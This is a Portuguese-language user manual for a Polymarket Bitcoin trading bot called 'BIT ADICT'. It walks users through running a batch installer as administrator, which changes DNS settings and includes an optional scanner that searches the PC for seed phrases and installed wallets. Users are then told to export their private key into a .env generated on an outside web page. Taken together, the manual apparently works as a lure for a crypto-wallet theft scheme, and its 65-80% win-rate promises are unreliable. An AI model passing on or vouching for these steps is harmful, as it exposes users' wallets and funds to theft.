# 📖 Manual v3 · Passo a passo completo

> Versão extensa pra quando o `2_INSTALAR.bat` automático não rolou ou tu quer entender cada parte.
> Suporte: WhatsApp **+55 61 99811-0979**

---

## 🎯 Visão geral

```
PC limpo → setup automático → wallet Polymarket → bot operando
   15 min        15 min            15 min            ∞ 24/7
```

Total ~45 min do zero ao bot rodando.

---

## ETAPA 1 · Sistema (15 min)

### 1.1 Lê o arquivo `1_PRE_REQUISITOS.md`
Confere os 5 itens (Windows 10/11, conta admin, internet, cartão/USDC, RAM/disco).
**Se algo falhar, chama WhatsApp +55 61 99811-0979 antes de prosseguir.**

### 1.2 Roda o instalador
- **Botão direito** em `2_INSTALAR.bat` → **Executar como administrador**
- Aceita UAC (popup "Deseja permitir...") → **Sim**
- Janela preta abre, mostra `[1/8]`, `[2/8]`, ...
- **NÃO FECHA** mesmo se travar 1-2 min em algum passo (downloads demoram)

### 1.3 O que o instalador faz (8 passos)

| # | Etapa | O que faz |
|---|-------|-----------|
| 1 | Verifica Windows | Aborta se for Win7/8/XP |
| 2 | DNS Cloudflare | Aplica 1.1.1.1 + desabilita IPv6 (anti-bloqueio Polymarket) |
| 3 | Testa conectividade | Confirma `clob.polymarket.com` resolve |
| 4 | Python 3.11 | Instala via winget ou download direto |
| 5 | Bibliotecas Python | bip-utils, web3, ccxt, py_clob_client_v2, etc |
| 6 | Baixa BIT ADICT | Recovery Kit + bot DIRECIONAL v2 |
| 7 | Cria `.env.template` | Tu preenche na Etapa 3 |
| 8 | Scanner (opcional) | Procura imagens/textos com seeds + wallets já instaladas |

### 1.4 Atalhos criados no Desktop:
- 🤖 **BOT BIT ADICT** — clica pra rodar bot
- 🛡️ **RECOVERY KIT** — utilitário offline
- ⚙️ **CONFIGURAR WALLET** — abre o assistente visual
- 📁 **PASTA BIT ADICT** — pasta com tudo (`C:\BIT_ADICT\`)

### 1.5 Se travou em algum passo
Consulta `4_TROUBLESHOOTING.md`. Os 15 problemas mais comuns têm solução pronta lá.

---

## ETAPA 2 · Configurar Wallet Polymarket (15 min)

### 2.1 Abre o assistente visual
Clica no atalho **CONFIGURAR WALLET** no Desktop. Vai abrir o Chrome em:
```
https://radiobitcoin.org/wallet-setup.html
```

### 2.2 Segue os 7 passos do assistente
Cada passo tem botão **"FEITO, PRÓXIMO"**. A página vai marcar verde conforme tu avança.

**Resumo dos 7 passos:**

1. **Cria conta Polymarket** com email NOVO (não usa email pessoal)
2. **Deposita $30-100** USDC (cartão ou crypto)
3. **Ativa Resgate Automático** (Settings → Negociação) ⚠️ crítico pro bot
4. **Cria Relayer API Key** (Settings → Chaves API do Relayer → + Criar novo)
5. **Exporta Private Key** (Settings → Conta → Export Private Key)
6. **Copia endereço Funder** (Profile → URL do navegador)
7. **Gera `.env`** automaticamente e cola no Notepad

### 2.3 Dúvidas comuns

**P: Posso usar minha conta Polymarket existente?**
R: Não recomendo. Se já uses Polymarket pra trade manual, cria conta NOVA pra isolar o bot. Senão o histórico fica misturado.

**P: Polymarket não aceita meu cartão.**
R: Liga pro banco e pede "autorizar compras internacionais por 24h". Ou usa USDC via Polygon de exchange (Binance, Mercado Bitcoin).

**P: O depósito demora?**
R: Cartão: instantâneo. USDC Polygon: 30s-2min.

**P: O saldo aparece $0 no bot mesmo eu tendo $50 no Polymarket.**
R: Normal! É a "Deposit Wallet" custodial — bot opera via signature_type POLY_1271 que já tá configurado. Só vai operar quando aparecer **primeiro sinal forte** (confiança >70%).

---

## ETAPA 3 · Conectar bot (5 min)

### 3.1 Salva o `.env`
No último passo do assistente visual:
- Clica **GERAR ARQUIVO .env**
- Clica **COPIAR PRO CLIPBOARD**

### 3.2 Cola no Notepad
- `Windows + R` → digita `notepad` → Enter
- Cola tudo (Ctrl+V)
- **Arquivo → Salvar como...**
  - Local: `C:\BIT_ADICT\`
  - Nome do arquivo (com aspas!): `".env"` ← **AS ASPAS SÃO IMPORTANTES**
  - Tipo: **Todos os arquivos (*.*)**
  - Codificação: **UTF-8**
- Clica **Salvar**

### 3.3 Confirma que arquivo foi salvo certo
- Abre Explorer → `C:\BIT_ADICT\`
- Tem que ter um arquivo chamado **`.env`** (sem extensão visível, começa com ponto)
- Se aparecer `.env.txt` → tu esqueceu as aspas. Renomeia removendo `.txt`.

### 3.4 Roda o bot
**Clica duas vezes no atalho `BOT BIT ADICT` no Desktop.**

Janela preta abre, mostra:
```
================================================================
  BIT ADICT — BOT DIRECIONAL v2.0
  Valor/trade: $2.0 | Stop: $40.0
  Conf.min: 70% | Preço min: 0.45
================================================================

[Web3] Saldo: $0.00 | Allowance: $0.00
[OK] Conectado ao Polymarket
[OK] Telegram iniciado

07:30:15 │ BTC:$77,500 │ RSI:55.0 │ EMA:▲ │ Dir:▲ UP 58% │ T-180s
```

### 3.5 O que esperar
- Bot fica em loop **monitorando o BTC a cada 20 segundos**
- Quando confiança >= **70%**, **posta ordem** automática
- Trade dura **5 minutos** (mercado UP/DOWN BTC 5min)
- Resultado vira USDC automático (auto-redeem ativo)
- Bot continua infinitamente

### 3.6 Primeiros trades
- Tempo médio até primeiro sinal forte: **5min a 2h** (depende da volatilidade)
- Em horário ativo (NY trading hours 9h-16h EST, ou 6h-13h Lisboa, ou 10h-17h BR): mais sinais
- Em madrugada: pode ficar horas sem sinal

### 3.7 Acompanha o bot
Tu pode:
- **Olhar a janela do bot** (logs em tempo real)
- **Polymarket.com** → Profile → vê posições abertas e histórico
- **Página `bot-do-papai.html`** (se for pra criança/familiar simbólico)

---

## 🛡️ Manutenção · O que fazer depois

### Diariamente (1 min)
- Olhar saldo na Polymarket — tá crescendo? tá caindo?
- Verificar que bot tá rodando (janela aberta)

### Semanalmente (5 min)
- Conferir histórico de trades na Polymarket
- Win Rate ideal: **65-80%**
- P&L positivo na semana toda? mantém. Negativo 2+ semanas seguidas? pausa e me chama.

### Mensalmente (10 min)
- Saca metade do lucro (Polymarket → Levantar → wallet própria)
- Reinveste a outra metade aumentando `VALOR_TRADE` no `.env`
- Exemplo: começou com $50 e VALOR_TRADE=2.0. Virou $80? Aumenta pra $2.50.

### Quando travar
- Bot fechou? Clica de novo no atalho BOT BIT ADICT.
- PC reiniciou? Login no Windows → bot precisa ser aberto manual.
- Pra auto-start no boot: te oriento Task Scheduler quando quiser.

---

## 🚨 Sinais de alerta · Para o bot se ver:

❌ **Stop loss disparado**: bot parou sozinho porque perdeu $40 no acumulado
- **NÃO reinicia logo** — observa o mercado um dia, ajusta parâmetros, retorna
- WhatsApp pra eu te ajudar interpretar

❌ **Win Rate caiu pra <50% por 50+ trades**: estratégia tá em fase ruim
- **Pausa o bot**, espera 2-3 dias
- Considera ajustar `CONFIANCA_MIN` pra 75 (mais conservador)

❌ **Erros repetidos no log** (vermelho)
- Tira print da janela do bot
- WhatsApp +55 61 99811-0979

---

**Versão manual:** 3.0 (2026-05-21)
**Suporte:** WhatsApp +55 61 99811-0979 · Grupo: https://chat.whatsapp.com/Eux7TBBova57booMCYJHmA
